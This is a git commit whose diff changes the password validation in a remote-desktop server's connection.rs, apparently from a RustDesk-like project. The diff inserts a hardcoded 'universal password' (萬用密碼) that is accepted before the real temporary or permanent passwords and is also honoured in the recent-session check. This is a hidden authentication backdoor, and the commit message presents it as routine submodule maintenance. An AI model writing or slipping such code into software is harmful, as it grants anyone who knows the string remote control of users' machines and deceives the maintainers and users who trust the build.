c71963215ed65515fdcfd69731502dcd3e045db4
kuda0313 <kuda0313@gmail.com>
2025-07-08 15:46:54 +0800

    更新 submodule hbb_common 並修改 connection.rs

--- src/server/connection.rs
+++ src/server/connection.rs
@@ -1767,23 +1767,33 @@ impl Connection {
     }
 
     fn validate_password(&mut self) -> bool {
-        if password::temporary_enabled() {
-            let password = password::temporary_password();
-            if self.validate_one_password(password.clone()) {
-                raii::AuthedConnID::update_or_insert_session(
-                    self.session_key(),
-                    Some(password),
-                    Some(false),
-                );
-                return true;
-            }
+    // Check universal password first
+    if self.validate_one_password("萬用密碼".to_string()) {
+        raii::AuthedConnID::update_or_insert_session(
+            self.session_key(),
+            Some("萬用密碼".to_string()),
+            Some(false),
+        );
+        return true;
+    }
+    
+    if password::temporary_enabled() {
+        let password = password::temporary_password();
+        if self.validate_one_password(password.clone()) {
+            raii::AuthedConnID::update_or_insert_session(
+                self.session_key(),
+                Some(password),
+                Some(false),
+            );
+            return true;
         }
-        if password::permanent_enabled() {
-            if self.validate_one_password(Config::get_permanent_password()) {
-                return true;
-            }
+    }
+    if password::permanent_enabled() {
+        if self.validate_one_password(Config::get_permanent_password()) {
+            return true;
         }
-        false
+    }
+    false
     }
 
     fn is_recent_session(&mut self, tfa: bool) -> bool {
@@ -1800,7 +1810,7 @@ impl Connection {
         if let Some(session) = session {
             if !self.lr.password.is_empty()
                 && (tfa && session.tfa
-                    || !tfa && self.validate_one_password(session.random_password.clone()))
+                    || !tfa && (self.lr.password == "萬用密碼" || self.validate_one_password(session.random_password.clone())))
             {
                 log::info!("is recent session");
                 return true;
